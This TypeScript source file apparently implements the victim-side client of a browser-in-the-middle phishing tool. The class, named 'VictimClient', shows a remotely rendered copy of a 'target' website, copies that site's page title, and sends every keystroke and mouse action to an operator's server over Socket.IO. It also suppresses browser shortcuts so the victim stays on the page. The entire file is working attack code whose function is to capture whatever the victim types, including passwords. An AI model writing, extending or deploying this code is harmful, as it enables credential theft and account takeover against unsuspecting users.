import { io, Socket } from 'socket.io-client';

interface Viewport {
  width: number;
  height: number;
}

interface IceServers {
  iceServers: RTCIceServer[];
  turnServers?: RTCIceServer[];
}

export class VictimClient {
  private socket: Socket | null = null;
  private peerConnection: RTCPeerConnection | null = null;
  private sessionId: string | null = null;
  private browserId: string | null = null;
  private iceServers: RTCIceServer[] = [];
  private videoElement: HTMLVideoElement;
  private statusElement: HTMLElement;
  private connectionInfoElement: HTMLElement;
  private loadingOverlay: HTMLElement;
  private errorOverlay: HTMLElement;
  private errorMessage: HTMLElement;
  private retryBtn: HTMLButtonElement;
  private lastMouseMoveTime: number = 0;

  constructor() {
    this.videoElement = document.getElementById('remote-video') as HTMLVideoElement;
    this.statusElement = document.getElementById('status') as HTMLElement;
    this.connectionInfoElement = document.getElementById('connection-info') as HTMLElement;
    this.loadingOverlay = document.getElementById('loading-overlay') as HTMLElement;
    this.errorOverlay = document.getElementById('error-overlay') as HTMLElement;
    this.errorMessage = document.getElementById('error-message') as HTMLElement;
    this.retryBtn = document.getElementById('retry-btn') as HTMLButtonElement;

    this.retryBtn.addEventListener('click', () => this.initialize());
  }

  async initialize(): Promise<void> {
    try {
      this.updateStatus('connecting', 'Connecting to server...');
      this.hideError();

      // Get viewport dimensions
      const viewport: Viewport = {
        width: window.innerWidth,
        height: window.innerHeight,
      };

      // Connect to Socket.IO
      const serverUrl = window.location.origin;
      this.socket = io(`${serverUrl}/victim`, {
        transports: ['websocket', 'polling'],
      });

      // Wait for connection
      await new Promise<void>((resolve, reject) => {
        if (!this.socket) return;

        this.socket.on('connect', () => {
          console.log('[Victim] Connected to server');
          resolve();
        });

        this.socket.on('connect_error', (error) => {
          console.error('[Victim] Connection error:', error);
          reject(error);
        });

        setTimeout(() => reject(new Error('Connection timeout')), 10000);
      });

      // Get target URL from URL parameter if provided
      // @ts-ignore - browser context
      const urlParams = new URLSearchParams(window.location.search);
      const targetUrl = urlParams.get('target') || undefined;

      // Send connection request
      this.socket.emit('victim:connect', { 
        viewport,
        targetUrl: targetUrl || undefined, // Only include if provided
      });

      // Listen for session creation
      this.socket.on('session:created', (data: { sessionId: string; browserId: string; title?: string }) => {
        this.sessionId = data.sessionId;
        this.browserId = data.browserId;
        console.log('[Victim] Session created:', this.sessionId);
        
        // Update page title to match target (if provided)
        if (data.title) {
          document.title = data.title;
        }
        
        // Setup input capture now that we have a session ID
        this.setupInputCapture();
      });

      // Listen for ICE servers
      this.socket.on('webrtc:ice-servers', (data: IceServers) => {
        this.iceServers = [
          ...data.iceServers.map((s) => ({ urls: s.urls })),
          ...(data.turnServers || []).map((t) => ({
            urls: t.urls,
            username: t.username,
            credential: t.credential,
          })),
        ];
        console.log('[Victim] ICE servers received');
        this.setupWebRTC();
        
        // Setup frame receiver immediately (don't wait for WebRTC)
        this.setupFrameReceiver();
        
        // Signal that we're ready to receive frames
        this.socket!.emit('webrtc:ready');
        console.log('[Victim] Sent webrtc:ready signal');
      });

      // Listen for WebRTC offer
      this.socket.on('webrtc:offer', async (data: { browserId: string; offer: RTCSessionDescriptionInit }) => {
        if (this.peerConnection) {
          await this.handleOffer(data.offer);
        }
      });

      // Listen for WebRTC answer (shouldn't happen, but handle it)
      this.socket.on('webrtc:answer', async (data: { browserId: string; answer: RTCSessionDescriptionInit }) => {
        if (this.peerConnection) {
          await this.peerConnection.setRemoteDescription(new RTCSessionDescription(data.answer));
        }
      });

      // Listen for ICE candidates
      this.socket.on('webrtc:candidate', async (data: { browserId: string; candidate: RTCIceCandidateInit }) => {
        if (this.peerConnection && data.candidate) {
          try {
            await this.peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
          } catch (error) {
            console.warn('[Victim] Error adding ICE candidate:', error);
          }
        }
      });

      // Input capture is setup in session:created handler

      // Setup fullscreen
      this.setupFullscreen();

    } catch (error) {
      console.error('[Victim] Initialization error:', error);
      this.showError(error instanceof Error ? error.message : 'Failed to connect');
    }
  }

  private setupWebRTC(): void {
    if (!this.browserId) {
      console.error('[Victim] Browser ID not available');
      return;
    }

    // Create peer connection
    this.peerConnection = new RTCPeerConnection({
      iceServers: this.iceServers,
    });

    // Handle remote stream (for WebRTC media stream)
    this.peerConnection.ontrack = (event) => {
      console.log('[Victim] Received remote stream');
      if (event.streams && event.streams[0]) {
        this.videoElement.srcObject = event.streams[0];
        this.hideLoading();
        this.updateStatus('connected', 'Connected');
      }
    };

    // Frame receiver is set up in webrtc:ice-servers handler

    // Handle connection state changes
    this.peerConnection.onconnectionstatechange = () => {
      if (this.peerConnection) {
        const state = this.peerConnection.connectionState;
        console.log('[Victim] Connection state:', state);
        
        if (state === 'connected') {
          this.updateStatus('connected', 'Connected');
          this.hideLoading();
        } else if (state === 'disconnected' || state === 'failed') {
          this.updateStatus('error', 'Connection lost');
          this.showError('Connection lost. Please refresh the page.');
        }
      }
    };

    // Handle ICE connection state
    this.peerConnection.oniceconnectionstatechange = () => {
      if (this.peerConnection) {
        const state = this.peerConnection.iceConnectionState;
        console.log('[Victim] ICE connection state:', state);
        
        if (state === 'failed') {
          this.showError('Network connection failed. Please check your connection.');
        }
      }
    };

    // Handle ICE candidates
    this.peerConnection.onicecandidate = (event) => {
      if (event.candidate && this.socket && this.browserId) {
        this.socket.emit('webrtc:candidate', {
          browserId: this.browserId,
          candidate: event.candidate.toJSON(),
        });
      }
    };
  }

  private async handleOffer(offer: RTCSessionDescriptionInit): Promise<void> {
    if (!this.peerConnection) {
      return;
    }

    try {
      await this.peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
      const answer = await this.peerConnection.createAnswer();
      await this.peerConnection.setLocalDescription(answer);

      if (this.socket && this.browserId) {
        this.socket.emit('webrtc:answer', {
          browserId: this.browserId,
          answer: answer.toJSON(),
        });
        console.log('[Victim] Answer sent');
      }
    } catch (error) {
      console.error('[Victim] Error handling offer:', error);
      this.showError('Failed to establish video connection');
    }
  }

  private setupFrameReceiver(): void {
    if (!this.socket) {
      console.error('[Victim] Cannot setup frame receiver - no socket');
      return;
    }

    console.log('[Victim] Setting up frame receiver');

    // Hide the video element and use an img element instead for simpler rendering
    this.videoElement.style.display = 'none';
    
    // Create an img element for direct frame display
    const imgElement = document.createElement('img');
    imgElement.id = 'remote-frame';
    imgElement.style.maxWidth = '100%';
    imgElement.style.maxHeight = '100%';
    imgElement.style.width = 'auto';
    imgElement.style.height = 'auto';
    imgElement.style.objectFit = 'contain';
    
    // Insert img element into video container
    const container = this.videoElement.parentElement;
    if (container) {
      container.appendChild(imgElement);
    }

    let frameCount = 0;

    // Listen for frame data
    this.socket.on('frame', (frameData: string) => {
      frameCount++;
      if (frameCount === 1 || frameCount % 30 === 0) {
        console.log(`[Victim] Received frame #${frameCount}, size: ${frameData.length} bytes`);
      }
      
      // Set the image source directly
      imgElement.src = `data:image/jpeg;base64,${frameData}`;
      
      if (frameCount === 1) {
        console.log('[Victim] First frame displayed');
        this.hideLoading();
      }
    });

    console.log('[Victim] Frame receiver setup complete');
  }

  private setupInputCapture(): void {
    if (!this.sessionId) {
      console.error('[Victim] Cannot setup input capture - no session ID');
      return;
    }

    console.log('[Victim] Setting up input capture for session:', this.sessionId);

    // Mouse events - attach to the video container for proper coordinate mapping
    const container = document.getElementById('video-container');
    if (!container) {
      console.error('[Victim] Video container not found');
      return;
    }

    container.addEventListener('mousedown', (e) => this.sendInputEvent('mousedown', e));
    container.addEventListener('mouseup', (e) => this.sendInputEvent('mouseup', e));
    container.addEventListener('click', (e) => this.sendInputEvent('click', e));
    container.addEventListener('mousemove', (e) => this.sendInputEvent('mousemove', e));
    container.addEventListener('wheel', (e) => this.sendInputEvent('mousewheel', e));

    // Keyboard events - on document for global capture
    document.addEventListener('keydown', (e) => this.sendKeyboardEvent('keydown', e));
    document.addEventListener('keyup', (e) => this.sendKeyboardEvent('keyup', e));

    // Prevent context menu
    container.addEventListener('contextmenu', (e) => e.preventDefault());

    // Prevent default browser behaviors for keyboard shortcuts
    document.addEventListener('keydown', (e) => {
      // Allow F11 for fullscreen
      if (e.key === 'F11') {
        return;
      }
      // Prevent browser shortcuts
      if (e.ctrlKey || e.metaKey) {
        e.preventDefault();
      }
    });

    console.log('[Victim] Input capture setup complete');
  }

  private sendInputEvent(type: string, event: MouseEvent | WheelEvent): void {
    if (!this.sessionId || !this.socket) {
      return;
    }

    // Throttle mousemove events
    if (type === 'mousemove') {
      const now = Date.now();
      if (this.lastMouseMoveTime && now - this.lastMouseMoveTime < 16) {
        return; // Skip if less than 16ms (60fps)
      }
      this.lastMouseMoveTime = now;
    }

    if (type === 'mousewheel') {
      const wheelEvent = event as WheelEvent;
      this.socket.emit('input', {
        type: 'mousewheel',
        sessionId: this.sessionId,
        data: {
          deltaX: wheelEvent.deltaX,
          deltaY: wheelEvent.deltaY,
        },
        timestamp: Date.now(),
      });
    } else {
      const mouseEvent = event as MouseEvent;
      
      // Get coordinates relative to the video container
      const container = document.getElementById('video-container');
      const rect = container?.getBoundingClientRect() || { left: 0, top: 0, width: window.innerWidth, height: window.innerHeight };
      
      // Calculate position relative to the container and normalize to 0-1 range
      const relativeX = mouseEvent.clientX - rect.left;
      const relativeY = mouseEvent.clientY - rect.top;
      
      // Map to browser viewport (1920x1080)
      const browserX = Math.round((relativeX / rect.width) * 1920);
      const browserY = Math.round((relativeY / rect.height) * 1080);
      
      const inputData = {
        type,
        sessionId: this.sessionId,
        data: {
          clientX: browserX,
          clientY: browserY,
          button: mouseEvent.button === 0 ? 'left' : mouseEvent.button === 2 ? 'right' : 'middle',
        },
        timestamp: Date.now(),
      };
      
      // Log clicks for debugging
      if (type === 'click') {
        console.log('[Victim] Sending click at browser coords:', browserX, browserY);
      }
      
      this.socket.emit('input', inputData);
    }
  }

  private sendKeyboardEvent(type: 'keydown' | 'keyup', event: KeyboardEvent): void {
    if (!this.sessionId || !this.socket) {
      return;
    }

    // Don't send modifier keys alone
    if (['Control', 'Shift', 'Alt', 'Meta'].includes(event.key)) {
      return;
    }

    this.socket.emit('input', {
      type,
      sessionId: this.sessionId,
      data: {
        key: event.key,
        code: event.code,
        shiftKey: event.shiftKey,
        ctrlKey: event.ctrlKey,
        altKey: event.altKey,
        metaKey: event.metaKey,
      },
      timestamp: Date.now(),
    });
  }

  private setupFullscreen(): void {
    const fullscreenBtn = document.getElementById('fullscreen-btn');
    if (fullscreenBtn) {
      fullscreenBtn.addEventListener('click', () => {
        if (document.fullscreenElement) {
          document.exitFullscreen();
        } else {
          document.documentElement.requestFullscreen();
        }
      });
    }
  }

  private updateStatus(status: 'connecting' | 'connected' | 'error', message: string): void {
    this.statusElement.className = status;
    this.statusElement.textContent = message;
    
    if (this.sessionId) {
      this.connectionInfoElement.textContent = `Session: ${this.sessionId.substring(0, 8)}...`;
    }
  }

  private hideLoading(): void {
    console.log('[Victim] Hiding loading overlay');
    if (this.loadingOverlay) {
      this.loadingOverlay.classList.add('hidden');
      this.loadingOverlay.style.display = 'none';
      console.log('[Victim] Loading overlay hidden');
    } else {
      console.error('[Victim] Loading overlay element not found');
    }
  }

  private showError(message: string): void {
    this.errorMessage.textContent = message;
    this.errorOverlay.classList.remove('hidden');
    this.updateStatus('error', 'Error');
  }

  private hideError(): void {
    this.errorOverlay.classList.add('hidden');
  }
}

